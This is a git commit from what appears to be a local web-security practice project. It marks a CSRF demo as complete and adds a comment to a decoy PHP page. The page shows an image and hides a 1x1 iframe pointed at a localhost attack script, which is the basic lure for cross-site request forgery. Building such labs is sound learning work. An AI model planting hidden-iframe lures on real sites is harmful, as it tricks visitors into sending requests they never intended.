0102026e297ad651443a3c914b42ca39f8191674
shuta13 <hollystarsun@gmail.com>
2020-05-24 23:21:46 +0900

    feat: CSRF完成

--- php/src/attack/csrf/fake.php
+++ php/src/attack/csrf/fake.php
@@ -1,3 +1,5 @@
+<!-- 画像 : https://pbs.twimg.com/media/D2a5nqpU0AEKVpq?format=jpg&name=medium -->
+
 <img src="https://pbs.twimg.com/media/D2a5nqpU0AEKVpq?format=jpg&name=medium" alt="Shigeru Joshima" />
 <iframe src="http://localhost:8080/attack/csrf/owata.php" width="1" height="1"></iframe>
 <p>
